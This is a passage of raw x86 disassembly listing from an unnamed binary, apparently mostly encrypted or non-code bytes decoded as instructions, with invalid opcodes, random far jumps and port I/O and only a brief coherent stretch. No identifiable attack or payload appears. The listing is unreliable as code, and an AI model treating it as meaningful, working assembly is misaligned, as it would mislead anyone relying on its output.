  411884:	(bad)  
  411885:	cdq    
  411886:	and    edx,DWORD PTR gs:[eax+eiz*1-0x5985987d]
  41188e:	xor    esi,DWORD PTR [edx]
  411890:	cdq    
  411891:	out    0xdf,eax
  411893:	mov    esi,0x27683e5a
  411898:	dec    esp
  411899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41189a:	sub    DWORD PTR [eax],edx
  41189c:	mov    BYTE PTR [ebx+0x1692601],bl
  4118a2:	(bad)  
  4118a4:	and    ecx,edi
  4118a6:	inc    ebx
  4118a7:	xchg   ecx,eax
  4118a8:	daa    
  4118a9:	ror    DWORD PTR [ecx+0x65172b31],cl
  4118af:	and    BYTE PTR [edi-0x236c844b],cl
  4118b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118b6:	jmp    DWORD PTR [edi+0x43]
  4118b9:	inc    edi
  4118ba:	or     edx,DWORD PTR [esi+ebx*8-0x7eefaa4a]
  4118c1:	xor    edx,esi
  4118c3:	test   al,0xb2
  4118c5:	repnz loope 0x41184c
  4118c8:	into   
  4118c9:	fst    st(0)
  4118cb:	bound  ebp,QWORD PTR [esi-0x5a]
  4118ce:	sub    BYTE PTR [esi+0x5e],bl
  4118d1:	push   esp
  4118d2:	gs out 0x90,al
  4118d5:	adc    eax,0x3166a6ec
  4118da:	mov    al,ds:0x145af63d
  4118df:	push   0x465cc7df
  4118e4:	fbld   TBYTE PTR [edi+0x7d]
  4118e7:	lds    edi,FWORD PTR [edx]
  4118e9:	popa   
  4118ea:	jp     0x4118b8
  4118ec:	icebp  
  4118ed:	dec    ebp
  4118ee:	jbe    0x4118cc
  4118f0:	sub    al,BYTE PTR [edx+0x1d]
  4118f3:	imul   eax,DWORD PTR [esi+0x4e572055],0xfffffffb
  4118fa:	mov    ds:0x9f86ae52,al
  4118ff:	lea    ebx,ds:0x3015595d
  411905:	and    BYTE PTR [ebx-0x7d],ah
  411908:	add    al,0x14
  41190a:	jmp    0xe9562556
  41190f:	jae    0x41195a
  411911:	test   ah,dl
  411913:	mov    ds:0x442190bd,al
  411918:	mov    ah,0x54
  41191a:	sub    esi,DWORD PTR [ebp+0x61ab70df]
  411920:	fiadd  DWORD PTR [ebx+eax*2+0x3087558d]
  411927:	aaa    
  411928:	scas   eax,DWORD PTR es:[edi]
  411929:	ja     0x4118e6
  41192b:	arpl   WORD PTR [ecx+esi*1],si
  41192e:	pop    edi
  41192f:	out    0xc2,eax
  411931:	shl    BYTE PTR [edx-0x6],1
  411934:	sub    ecx,DWORD PTR [ebp+0x5d61c9f8]
  41193a:	cwde   
  41193b:	sub    eax,0x4d5f7790
  411940:	and    ah,0x1e
  411943:	(bad)  
  411944:	test   BYTE PTR fs:[ebx-0x6f],0x10
  411949:	arpl   WORD PTR [ecx+eiz*1],bx
  41194c:	adc    al,0xaa
  41194e:	mov    ah,0x53
  411950:	cli    
  411951:	nop
  411952:	xchg   DWORD PTR [ebx+ebx*2],ecx
  411955:	ret    0xf265
  411958:	jge    0x41195d
  41195a:	lea    eax,[ebp-0x8]
  41195d:	push   eax
  41195e:	push   DWORD PTR [ebp-0x28]
  411961:	push   DWORD PTR [ebp+0xc]
  411964:	call   0x413f1f
  411969:	mov    eax,DWORD PTR [ebp-0x4]
  41196c:	mov    ecx,DWORD PTR [ebp-0x8]
  41196f:	xor    eax,esi
  411971:	add    eax,edi
  411973:	cmp    ecx,eax
  411975:	je     0x413d0c
  41197b:	mov    eax,DWORD PTR [ebp-0x34]
  41197e:	movzx  eax,WORD PTR [eax+ebx*2]
  411982:	jmp    0x413cfe
  411987:	mov    esp,0x8265841a
  41198c:	loope  0x41192c
  41198e:	add    BYTE PTR [eax+0x74],0x97
  411992:	cmp    edx,DWORD PTR es:[ebx-0x74ef6b96]
  411999:	add    DWORD PTR [ebx-0x7c7ca1de],0x52
  4119a0:	xchg   esp,eax
  4119a1:	sub    ebp,esi
  4119a3:	mov    bl,0xb9
  4119a5:	out    dx,al
  4119a6:	pushf  
  4119a7:	xchg   ebx,eax
  4119a8:	pop    ebp
  4119a9:	out    0xbd,eax
  4119ab:	dec    eax
  4119ac:	or     ch,BYTE PTR [ebp+0x49a47b3]
  4119b2:	iret   
  4119b3:	in     eax,dx
  4119b4:	mov    al,ds:0xcdb3ee98
  4119b9:	pop    ebp
  4119ba:	out    dx,eax
  4119bb:	shl    BYTE PTR [edx],0x47
  4119be:	adc    eax,0xc582d2a4
  4119c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119c4:	adc    eax,0xa7c4d3dc
  4119c9:	pushf  
  4119ca:	push   edx
  4119cb:	mov    edi,edx
  4119cd:	and    edx,DWORD PTR [edi-0x31af1cde]
  4119d3:	pop    esp
  4119d4:	mov    DWORD PTR [eax],ecx
  4119d6:	xchg   ebp,eax
  4119d7:	jp     0x411a46
  4119d9:	pop    ds
  4119da:	jl     0x411a2b
  4119dc:	pop    ecx
  4119dd:	outs   dx,BYTE PTR ds:[esi]
  4119de:	imul   ebp,DWORD PTR [edi-0x17],0xffffffc5
  4119e2:	jp     0x411a43
  4119e4:	xchg   BYTE PTR [edx+0x40c1b2ec],bl
  4119ea:	lahf   
  4119eb:	stc    
  4119ec:	cmp    ch,ah
  4119ee:	int3   
  4119ef:	mov    ecx,0x3ab2babb
  4119f4:	push   ecx
  4119f5:	js     0x4119a9
  4119f7:	stos   DWORD PTR es:[edi],eax
  4119f8:	cmp    eax,DWORD PTR [edx+ecx*1-0x74]
  4119fc:	test   DWORD PTR [ebp+0x5b],edi
  4119ff:	mov    ds:0x1f57bdf6,al
  411a04:	es pusha 
  411a06:	add    bl,BYTE PTR [edi+0x358d3980]
  411a0c:	adc    esi,DWORD PTR [ebp+edx*8-0x14]
  411a10:	push   edx
  411a11:	fld    DWORD PTR [eax]
  411a13:	jmp    0x1ea1:0xb1e4b322
  411a1a:	ins    DWORD PTR es:[edi],dx
  411a1b:	rcl    DWORD PTR [edi+0x3e669412],1
  411a21:	xor    ebx,DWORD PTR [eax]
  411a23:	aam    0x3f
  411a25:	adc    ebx,ecx
  411a27:	jg     0x411aa1
  411a29:	outs   dx,DWORD PTR ds:[esi]
  411a2a:	pop    ebp
  411a2b:	mov    ah,0xf5
  411a2d:	sub    al,0x43
  411a2f:	push   esi
  411a30:	xor    DWORD PTR [edi+0x42c68350],esi
  411a36:	adc    al,0x65
  411a38:	xchg   edx,eax
  411a39:	mov    bl,0x6c
  411a3b:	add    al,0xb9
  411a3d:	cld    
  411a3e:	or     DWORD PTR [edi+edi*4+0x3785d12],ebx
  411a45:	nop
  411a46:	ja     0x4119fc
  411a48:	and    eax,0xb9a1da69
  411a4d:	xlat   BYTE PTR ds:[ebx]
  411a4e:	sbb    ah,BYTE PTR [esi+edi*1]
  411a51:	inc    edi
  411a52:	mov    edi,0x658ce43f
  411a57:	mov    ecx,0x39a2f6d9
  411a5c:	jmp    0xdde372d2
  411a61:	ret    0xd52b
  411a64:	adc    esp,DWORD PTR [edx]
  411a66:	inc    esp
  411a67:	ds push ecx
  411a69:	xchg   ebp,eax
  411a6a:	out    0xf4,eax
  411a6c:	stos   DWORD PTR es:[edi],eax
  411a6d:	xor    esi,DWORD PTR [ecx]
  411a6f:	mov    dh,0xbc
  411a71:	aad    0x87
  411a73:	mov    ecx,0xd99034a6
  411a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a79:	and    BYTE PTR [ecx+eiz*1],0x12
  411a7d:	ret    
  411a7e:	dec    edi
  411a7f:	push   ebp
  411a80:	ss dec ecx
  411a82:	dec    edi
  411a83:	sahf   
  411a84:	lds    edx,FWORD PTR [edx]
  411a86:	mov    cs,ebp
  411a88:	mov    BYTE PTR [ecx-0x6faf1323],ch
  411a8e:	inc    edx
  411a8f:	add    al,0x20
  411a91:	sbb    bh,dh
  411a93:	(bad)  [ecx]
  411a95:	or     eax,0xac303763
  411a9a:	(bad)  
  411a9b:	icebp  
  411a9c:	xchg   esi,eax
  411a9d:	sub    esp,0x23
  411aa0:	imul   edi,DWORD PTR [eax],0xec4c0b8e
  411aa6:	out    dx,eax
  411aa7:	out    0x8f,eax
  411aa9:	mov    ds:0xe7d49df0,al
  411aae:	popf   
  411aaf:	and    esp,esi
  411ab1:	pop    eax
  411ab2:	pop    eax
  411ab3:	lods   al,BYTE PTR ds:[esi]
  411ab4:	out    dx,al
  411ab5:	call   0x6cb6:0x73d8016b
  411abc:	dec    esi
  411abd:	repnz pop ecx
  411abf:	add    eax,DWORD PTR [ecx+0x43]
  411ac2:	cmp    BYTE PTR [esi+0x2250bf1f],bh
  411ac8:	mov    DWORD PTR [eax],edi
  411aca:	pop    edi
  411acb:	mov    bh,0xf8
  411acd:	(bad)  
  411ace:	xchg   BYTE PTR [ebp-0x74],dh
  411ad1:	jo     0x411b0a
  411ad3:	rol    BYTE PTR [ecx+ecx*2+0x56],cl
  411ad7:	(bad)  
  411ad8:	push   edi
  411ad9:	cmp    BYTE PTR [esi+0x7bf1d863],ah
  411adf:	cwde   
  411ae0:	mov    BYTE PTR [esi+0x7],cl
  411ae3:	push   0x49aaaeea
  411ae8:	nop
  411ae9:	and    cl,0x2
  411aec:	inc    esi
  411aed:	mov    ds:0xb5591f87,al
  411af2:	pop    esp
  411af3:	jmp    0x411ad0
  411af5:	add    edx,DWORD PTR [di+0x77]
  411af9:	mov    ebx,0x2608ff30
  411afe:	add    eax,0xb687b17f
  411b03:	adc    eax,0x772f9ed2
  411b08:	mov    esi,esi
  411b0a:	xor    edi,eax
  411b0c:	mov    ecx,0x13c9be55
  411b11:	push   ecx
  411b12:	pushf  
  411b13:	fisubr DWORD PTR [esi]
  411b15:	push   0x68a3501a
  411b1a:	cdq    
  411b1b:	dec    esi
  411b1c:	push   ebp
  411b1d:	inc    esp
  411b1e:	clc    
  411b1f:	test   al,0x58
  411b21:	ret    0xfd72
  411b24:	sub    DWORD PTR [ecx+0x56],0x5a
  411b28:	stos   DWORD PTR es:[edi],eax
  411b29:	sar    BYTE PTR [edi-0x73],0xf
  411b2d:	ds pusha 
  411b2f:	xchg   ebp,eax
  411b30:	push   0x30
  411b32:	pop    ds
  411b33:	pop    cx
  411b35:	leave  
  411b36:	add    eax,0x8d938ae0
  411b3b:	test   BYTE PTR [ebx-0x3d],dh
  411b3e:	push   es
  411b3f:	push   cs
  411b40:	aas    
  411b41:	sub    BYTE PTR [edx],cl
  411b43:	and    al,0xe4
  411b45:	cmp    eax,0x42821355
  411b4a:	bound  ebx,QWORD PTR [ecx+ebx*4+0x13]
  411b4e:	sbb    cl,dh
  411b50:	sub    DWORD PTR [ebx+0x5a],ecx
  411b53:	adc    DWORD PTR [ecx],0x6d3af537
  411b59:	mov    eax,0xa46837af
  411b5e:	lahf   
  411b5f:	dec    esp
  411b60:	inc    ecx
  411b61:	mov    eax,0xd6e9e553
  411b66:	fsubr  QWORD PTR [eax+0x33]
  411b69:	inc    edx
  411b6a:	xor    bl,BYTE PTR [ebp+0x651da671]
  411b70:	ins    BYTE PTR es:[edi],dx
  411b71:	nop
  411b72:	cmp    dh,dl
  411b74:	and    al,BYTE PTR [edx-0x2f]
  411b77:	and    eax,edx
  411b79:	addr16 push ebp
  411b7b:	and    eax,0x213c1f0f
  411b80:	and    bl,al
  411b82:	repz repz xchg bp,ax
  411b86:	std    
  411b87:	xlat   BYTE PTR ds:[ebx]
  411b88:	add    eax,0xd0d1ed4
  411b8d:	mov    cl,0xf1
  411b8f:	lods   al,BYTE PTR ds:[esi]
  411b90:	dec    eax
  411b91:	aam    0xf8
  411b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b94:	shl    BYTE PTR [edi+ecx*4+0x23],0x1e
  411b99:	enter  0x33cb,0x5
  411b9d:	xlat   BYTE PTR ds:[ebx]
  411b9e:	ds and al,0x45
  411ba1:	scas   al,BYTE PTR es:[edi]
  411ba2:	fs test eax,0xc13ce1d7
  411ba8:	gs xchg edi,eax
  411baa:	not    DWORD PTR [ebp+0x0]
  411bad:	cmp    al,0x8a
  411baf:	data16 (bad) 
  411bb1:	jmp    ebx
  411bb3:	ffreep st(1)
  411bb5:	cwde   
  411bb6:	inc    esp
  411bb7:	mov    cl,0x28
  411bb9:	jnp    0x411b4e
  411bbb:	ds mov edi,0x16c2a95c
  411bc1:	inc    esi
  411bc2:	and    eax,0x569c0e70
  411bc7:	(bad)  
  411bc8:	loope  0x411c25
  411bca:	gs mov esi,edx
  411bcd:	out    dx,al
  411bce:	mov    ch,0x7c
  411bd0:	imul   eax,DWORD PTR [edx-0x7e1041a4],0x4b
  411bd7:	xor    BYTE PTR [ecx],dh
  411bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bda:	test   DWORD PTR [edx-0x5b4e9108],0x54353273
  411be4:	in     eax,dx
  411be5:	cmp    dh,BYTE PTR [eax-0x3be92ad6]
  411beb:	daa    
  411bec:	and    eax,0xa3ee15d5
  411bf1:	inc    esi
  411bf2:	int    0x3c
  411bf4:	call   FWORD PTR [ecx-0x724b9511]
  411bfa:	outs   dx,BYTE PTR ds:[esi]
  411bfb:	pop    ss
  411bfc:	sbb    al,0x1
  411bfe:	push   edi
  411bff:	rol    ebx,0x90
  411c02:	xor    al,0xec
  411c04:	jle    0x411bf2
  411c06:	cmc    
  411c07:	out    dx,al
  411c08:	imul   ebx,DWORD PTR [eax+0x3a9eb31e],0x61
  411c0f:	loope  0x411be8
  411c11:	cmc    
  411c12:	and    eax,0xe5afaddc
  411c17:	pop    ebp
  411c18:	xchg   edx,eax
  411c19:	call   0x5e25:0x50b723e1
  411c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c21:	(bad)  
  411c22:	sti    
  411c23:	jo     0x411c11
  411c25:	call   0x930a:0x7c8ef990
  411c2c:	push   esi
  411c2d:	cs dec eax
  411c2f:	adc    esp,DWORD PTR [ebx]
  411c31:	fcom   QWORD PTR [esi+0xb]
  411c34:	sub    DWORD PTR [edx],esi
  411c36:	xor    DWORD PTR [eax+ebp*8-0x7fffebc6],edx
  411c3d:	in     al,dx
  411c3e:	sub    DWORD PTR [edi-0x169b85ca],esi
  411c44:	lea    ebx,[ebx+0x13]
  411c47:	js     0x411c42
  411c49:	fild   DWORD PTR [esi+0x43]
  411c4c:	push   edi
  411c4d:	mov    dh,0xa1
  411c4f:	push   es
  411c50:	pop    ss
  411c51:	cdq    
  411c52:	(bad)
  411c55:	jb     0x411cca
  411c57:	sbb    eax,DWORD PTR ds:0x1fdd1afe
  411c5d:	sub    eax,0x25bcebc7
  411c62:	jae    0x411c3a
  411c64:	mov    bh,0x2b
  411c66:	add    edi,0x3f9ae2f8
  411c6c:	xchg   BYTE PTR [esi-0x45],ah
  411c6f:	enter  0x171b,0x8
  411c73:	dec    edx
  411c74:	xchg   BYTE PTR [ecx-0x2813f972],bh
  411c7a:	xchg   esi,eax
  411c7b:	inc    eax
  411c7c:	mov    esp,0xd2125493
  411c81:	xchg   ebp,eax
  411c82:	push   eax
  411c83:	js     0x411c64
  411c85:	call   0xa33ef713
  411c8a:	push   ebp
  411c8b:	(bad)  
  411c8d:	icebp  
  411c8e:	in     al,dx
  411c8f:	xchg   ecx,eax
  411c90:	loop   0x411c97
  411c92:	sbb    eax,0xb08d78e9
  411c97:	push   ebx
  411c98:	cmp    bh,0xbb
  411c9b:	add    BYTE PTR [edx+0x4461a153],al
  411ca1:	cmp    BYTE PTR es:[eax-0xb],ah
  411ca5:	call   0x443d:0xc9ceaa11
  411cac:	pop    ss
  411cad:	enter  0x737,0xb3
  411cb1:	mov    bh,0xaa
  411cb3:	fnstenv [edx-0x7954c82f]
  411cb9:	jo     0x411cb5
  411cbb:	mov    cl,0x19
  411cbd:	dec    esp
  411cbe:	pop    esp
  411cbf:	(bad)  
  411cc0:	cmp    ecx,DWORD PTR [ecx-0xd]
  411cc3:	iret   
  411cc4:	inc    edx
  411cc5:	pop    ecx
  411cc6:	inc    edx
  411cc7:	mov    bl,0x48
  411cc9:	push   edi
  411cca:	mov    ds:0xb610db38,eax
  411ccf:	mov    esi,edx
  411cd1:	fld    DWORD PTR [ecx+0x10]
  411cd4:	push   esi
  411cd5:	adc    cl,bl
  411cd7:	mov    bh,0x15
  411cd9:	mov    ch,0xde
  411cdb:	adc    al,0xfb
  411cdd:	mov    edx,0x508dfed3
  411ce2:	sub    dl,BYTE PTR [edx+0x38a38de1]
  411ce8:	jnp    0x411d5e
  411cea:	jge    0x411d65
  411cec:	stos   DWORD PTR es:[edi],eax
  411ced:	push   eax
  411cee:	add    al,ch
  411cf0:	fild   WORD PTR [eax-0x67]
  411cf3:	jae    0x411d30
  411cf5:	and    eax,DWORD PTR [esi+edx*4-0x26]
  411cf9:	mov    al,ds:0x62809b53
  411cfe:	out    0xea,al
  411d00:	stc    
  411d01:	aam    0x6f
  411d03:	jecxz  0x411cd3
  411d05:	xchg   ebp,eax
  411d06:	loop   0x411d03
  411d08:	dec    esi
  411d09:	dec    esi
  411d0a:	retf   
  411d0b:	inc    esi
  411d0c:	jb     0x411cc9
  411d0e:	adc    BYTE PTR [esi-0x11],dl
  411d11:	or     bl,BYTE PTR [eax-0x5df051fa]
  411d17:	nop
  411d18:	xchg   DWORD PTR [ecx-0xf],edi
  411d1b:	imul   esi,DWORD PTR [edx+0xd],0xb2136590
  411d22:	lds    esi,FWORD PTR [edi]
  411d24:	fcompp 
  411d26:	in     eax,dx
  411d27:	int    0xc4
  411d29:	test   DWORD PTR [eax],ebx
  411d2b:	cmp    dh,bl
  411d2d:	call   0x85f1:0x1b8a4293
  411d34:	(bad)  
  411d35:	shl    DWORD PTR [edx-0x54],1
  411d38:	adc    eax,0xcc57e73
  411d3d:	mov    eax,0x531bb929
  411d42:	dec    eax
  411d43:	lods   eax,DWORD PTR ds:[esi]
  411d44:	inc    esi
  411d45:	pop    ebp
  411d46:	adc    BYTE PTR [ecx],ah
  411d48:	pop    eax
  411d49:	push   es
  411d4a:	loope  0x411d2a
  411d4c:	test   eax,0x5c1ae625
  411d51:	jnp    0x411d88
  411d53:	and    dl,BYTE PTR [esi+0x23]
  411d56:	inc    BYTE PTR [edi+0x789cecf2]
  411d5c:	push   esp
  411d5d:	push   esp
  411d5e:	loopne 0x411d91
  411d60:	mov    ah,0x9b
  411d62:	fisttp QWORD PTR [eax+0x141c73af]
  411d68:	in     al,dx
  411d69:	and    dl,ah
  411d6b:	retf   
  411d6c:	jne    0x411d3b
  411d6e:	cmc    
  411d6f:	mov    ecx,0xea99b1a6
  411d74:	cmp    eax,0xbf303e51
  411d79:	jnp    0x411d06
  411d7b:	test   eax,esp
  411d7d:	imul   eax,DWORD PTR [esi+ebx*4-0x25],0xd31cefa8
  411d85:	ss hlt 
  411d87:	mov    edx,0x9c689fc
  411d8c:	cmc    
  411d8d:	add    BYTE PTR [ebp-0x6],0x27
  411d91:	ret    
  411d92:	lock or bh,cl
  411d95:	shl    DWORD PTR [edx+0x259be590],1
  411d9b:	inc    edx
  411d9c:	and    al,0xc1
  411d9e:	(bad)  
  411d9f:	xor    eax,0x17ce353b
  411da4:	mov    esi,ebx
  411da6:	adc    DWORD PTR [ebp+0x78],edi
  411da9:	cmc    
  411daa:	outs   dx,BYTE PTR ds:[esi]
  411dab:	jae    0x411d33
  411dad:	imul   DWORD PTR [ebx]
  411daf:	pusha  
  411db0:	mov    BYTE PTR es:[ecx-0x62],cl
  411db4:	lahf   
  411db5:	icebp  
  411db6:	pop    ds
  411db7:	(bad)
  411dbc:	retf   0xea78
  411dbf:	dec    edi
  411dc0:	mov    es,WORD PTR [eax-0x19e2483f]
  411dc6:	retf   
  411dc7:	push   ebp
  411dc8:	inc    esp
  411dc9:	fnstcw WORD PTR [ebp+0x4e1fff6b]
  411dcf:	sub    al,0x92
  411dd1:	fldcw  WORD PTR [ebx-0x689db1b9]
  411dd7:	leave  
  411dd8:	push   ebx
  411dd9:	popf   
  411dda:	sahf   
  411ddb:	gs jg  0x411e00
  411dde:	mov    dh,0xc
  411de0:	in     eax,dx
  411de1:	jge    0x411de3
  411de3:	das    
  411de4:	mov    cl,0xfa
  411de6:	jno    0x411d87
  411de8:	(bad)  
  411de9:	aas    
  411dea:	mov    ah,0xcd
  411dec:	repnz arpl WORD PTR [eax+eax*4],cx
  411df0:	loopne 0x411db9
  411df2:	into   
  411df3:	fs and al,0xe8
  411df6:	adc    al,0x2f
  411df8:	dec    ecx
  411df9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dfa:	gs push edi
  411dfc:	loop   0x411e12
  411dfe:	pop    eax
  411dff:	pop    eax
  411e00:	data16 xor BYTE PTR [ebx-0x7b],dh
  411e04:	push   edx
  411e05:	or     BYTE PTR [eax],ah
  411e07:	jne    0x411e4b
  411e09:	xor    eax,0xb0bcff2b
  411e0e:	inc    esp
  411e0f:	or     ah,BYTE PTR [esp+ebx*1+0x5c]
  411e13:	pusha  
  411e14:	aas    
  411e15:	mov    bl,0x1e
  411e17:	and    ecx,eax
  411e19:	dec    ecx
  411e1a:	ins    BYTE PTR es:[edi],dx
  411e1b:	sub    dh,BYTE PTR [esi+eax*8+0x1d080e4f]
  411e22:	fstp   TBYTE PTR [eax+0x30e0f05d]
  411e28:	in     eax,dx
  411e29:	and    BYTE PTR [edx+ebx*4],bh
  411e2c:	sbb    ebx,DWORD PTR [esi]
  411e2e:	(bad)  
  411e2f:	and    ch,bl
  411e31:	shr    BYTE PTR [ecx+0x67882f70],0x89
  411e38:	jl     0x411de3
  411e3a:	or     eax,0x2392b5fd
  411e3f:	jp     0x411ebf
  411e41:	fs std 
  411e43:	inc    ebp
  411e44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e45:	(bad)  
  411e46:	adc    eax,0xcfe77ce
  411e4b:	mov    ds:0x4bfdd38,al
  411e50:	and    eax,0x95687719
  411e55:	ret    0x7a86
  411e58:	fwait
  411e59:	bswap  eax
  411e5b:	call   0x1caecbec
  411e60:	push   ebx
  411e61:	leave  
  411e62:	sahf   
  411e63:	fld    TBYTE PTR [edx+edx*2-0x3]
  411e67:	mov    esi,0x3f5b6648
  411e6c:	(bad)  
  411e6d:	ins    BYTE PTR es:[edi],dx
  411e6e:	xchg   BYTE PTR [eax-0x18],dh
  411e71:	call   0xd8dd99bd
  411e76:	fs push edi
  411e78:	repz pop esi
  411e7a:	test   BYTE PTR [ecx-0x51],0x62
  411e7e:	xchg   esp,eax
  411e7f:	sub    al,0xfd
  411e81:	or     dl,BYTE PTR [ecx+esi*2]
  411e84:	aam    0x1
  411e86:	jbe    0x411e42
  411e88:	stc    
  411e89:	adc    DWORD PTR [ebx+0x22],ebp
  411e8c:	mov    bh,bh
  411e8e:	std    
  411e8f:	push   ss
  411e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e91:	pop    edi
  411e92:	icebp  
  411e93:	mov    ds:0xd0d81d01,al
  411e98:	mov    bh,0x4e
  411e9a:	sub    eax,0x628ffb1a
  411e9f:	xchg   esi,eax
  411ea0:	mov    dh,0x49
  411ea2:	dec    ebp
  411ea3:	mov    cs,WORD PTR [eax+0x39]
  411ea6:	fmul   QWORD PTR ss:[ebx+0x14]
  411eaa:	cmp    bl,bh
  411eac:	les    ebx,FWORD PTR [esi+0x4c318b14]
  411eb2:	pop    esi
  411eb3:	jnp    0x411f0a
  411eb5:	rol    BYTE PTR [eax+0xc],cl
  411eb8:	jb     0x411e92
  411eba:	dec    esi
  411ebb:	(bad)  
  411ebc:	aad    0x4d
  411ebe:	inc    ebx
  411ebf:	cmp    esi,DWORD PTR [esi+ebp*1-0x2e]
  411ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ec4:	sahf   
  411ec5:	mov    eax,DWORD PTR [ecx]
  411ec7:	inc    ebx
  411ec8:	je     0x411f2f
  411eca:	pop    ecx
  411ecb:	pushf  
  411ecc:	cmp    DWORD PTR [edi],ebp
  411ece:	(bad)  
  411ecf:	push   ecx
  411ed0:	sub    DWORD PTR [eax-0x59],ecx
  411ed3:	enter  0x3ba6,0x88
  411ed7:	in     eax,dx
  411ed8:	daa    
  411ed9:	lods   eax,DWORD PTR ds:[esi]
  411eda:	xor    cl,BYTE PTR [edx-0x3a4f40de]
  411ee0:	push   0x14
  411ee2:	test   DWORD PTR [edx+0x21],edx
  411ee5:	fldcw  WORD PTR [ebp+0x4c]
  411ee8:	sbb    ecx,DWORD PTR [edx+0x1084dd1f]
  411eee:	mov    ebp,DWORD PTR [ebx]
  411ef0:	mov    cl,0x1c
  411ef2:	shr    eax,0x89
  411ef5:	test   dh,0x64
  411ef8:	sbb    al,0x8b
  411efa:	dec    edi
  411efb:	lock xlat BYTE PTR ds:[ebx]
  411efd:	pop    eax
  411efe:	cdq    
  411eff:	shl    DWORD PTR [edx],0x4e
  411f02:	xor    al,0xd0
  411f04:	xchg   edx,eax
  411f05:	dec    eax
  411f06:	hlt    
  411f07:	test   eax,0x80f54d6d
  411f0c:	in     eax,dx
  411f0d:	stc    
  411f0e:	dec    ebx
  411f0f:	js     0x411f75
  411f11:	mov    di,0x593d
  411f15:	(bad)  [ebp-0x59]
  411f18:	mov    ds:0xae95872,eax
  411f1d:	out    0xea,al
  411f1f:	loope  0x411f3a
  411f21:	test   eax,0x1f1da4a3
  411f26:	aaa    
  411f27:	test   DWORD PTR [esi],edi
  411f29:	pop    edi
  411f2a:	mov    eax,0xa8665613
  411f2f:	gs dec edi
  411f31:	out    0xdd,eax
  411f33:	ret    
  411f34:	add    ah,cl
  411f36:	aaa    
  411f37:	pop    ss
  411f38:	add    al,BYTE PTR [esi+eax*2]
  411f3b:	or     eax,0x69d39c1f
  411f40:	pop    esp
  411f41:	(bad)  
  411f42:	aas    
  411f43:	(bad)  
  411f44:	cwde   
  411f45:	jae    0x411f45
  411f47:	out    0x6c,al
  411f49:	rol    BYTE PTR [ecx],cl
  411f4b:	out    dx,al
  411f4c:	lds    ecx,FWORD PTR [edx+eiz*1]
  411f4f:	je     0x411f4c
  411f51:	adc    eax,0x47be0fc0
  411f56:	mov    ah,0x5e
  411f58:	or     al,0x9d
  411f5a:	pop    ss
  411f5b:	mov    ah,0x61
  411f5d:	rcr    BYTE PTR ds:0xfc5b96e2,0xc4
  411f64:	in     al,0xc2
  411f66:	inc    eax
  411f67:	ja     0x411fe0
  411f69:	push   cs
  411f6a:	pop    es
  411f6b:	dec    ecx
  411f6c:	mov    ch,0xd5
  411f6e:	sbb    ah,BYTE PTR [ecx+eiz*8-0x6ddba0e6]
  411f75:	mov    eax,ebp
  411f77:	xor    BYTE PTR [esi+0x6204ec80],0x7d
  411f7e:	xchg   eax,edx
  411f80:	xchg   ebp,eax
  411f81:	cmp    al,0x38
  411f83:	lods   al,BYTE PTR ds:[esi]
  411f84:	popa   
  411f85:	mov    ecx,0xf7d4235b
  411f8a:	inc    edx
  411f8b:	push   ecx
  411f8c:	std    
  411f8d:	push   es
  411f8e:	fdiv   st,st(0)
  411f90:	loopne 0x41200a
  411f92:	cmc    
  411f93:	sub    edi,DWORD PTR [ebp+ecx*2+0x60]
  411f97:	dec    esp
  411f98:	call   0xcb69:0xaf8fee90
  411f9f:	and    eax,0x1e76b0cb
  411fa4:	sbb    BYTE PTR [ebp+0x3abbf66d],0xbe
  411fab:	rcr    bl,0xe6
  411fae:	cmp    BYTE PTR [eax+0x25f4c118],0x53
  411fb5:	loop   0x411fe1
  411fb7:	push   0x942a31d4
  411fbc:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  411fbe:	cmp    al,0x7e
  411fc0:	xchg   esi,eax
  411fc1:	adc    al,BYTE PTR [edx-0x56425fe]
  411fc7:	fadd   DWORD PTR [ecx+0x118d79fb]
  411fcd:	js     0x411fd1
  411fcf:	mov    ch,BYTE PTR [ecx-0x33]
  411fd2:	dec    ecx
  411fd3:	inc    ebp
  411fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fd5:	dec    ebp
  411fd6:	sub    ecx,DWORD PTR [eax]
  411fd8:	outs   dx,BYTE PTR ds:[esi]
  411fd9:	in     al,dx
  411fda:	imul   si,WORD PTR [ecx-0x2],0xff9f
  411fdf:	lahf   
  411fe0:	mov    bh,0x83
  411fe2:	jno    0x412063
  411fe4:	ror    DWORD PTR [esi*2+0xbe0c54],cl
  411feb:	test   BYTE PTR [esi+edx*2],0x8d
  411fef:	cld    
  411ff0:	jae    0x411f9e
  411ff2:	jne    0x412007
  411ff4:	mov    al,ds:0xad202a25
  411ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ffa:	mov    eax,0x4b172331
  411fff:	(bad)  
  412000:	out    0xa6,al
  412002:	or     eax,0x9586fe5c
  412007:	inc    eax
  412008:	sbb    DWORD PTR [ecx+eax*4+0x58],esi
  41200c:	fnsave ds:0x37101efd
  412012:	fcomp  DWORD PTR ds:0x8db8168d
  412018:	push   es
  412019:	xchg   esp,eax
  41201a:	pop    eax
  41201b:	loop   0x411fd8
  41201d:	pop    eax
  41201e:	inc    esi
  41201f:	pop    es
  412020:	xor    eax,esp
  412022:	icebp  
  412023:	popa   
  412024:	xor    DWORD PTR [ebx+0x5d],esi
  412027:	add    BYTE PTR [esi-0x4e24fe6a],bh
  41202d:	mov    WORD PTR [esi-0xa],?
  412030:	add    esp,esi
  412032:	cs call 0x6dd2:0xa0cdc5e5
  41203a:	(bad)  
  41203c:	mov    al,0xd8
  41203e:	xchg   DWORD PTR [eax],ecx
  412040:	aad    0xb1
  412042:	add    edx,DWORD PTR [edi+0x7b]
  412045:	jmp    0x412068
  412047:	hlt    
  412048:	jno    0x41207e
  41204a:	inc    ebp
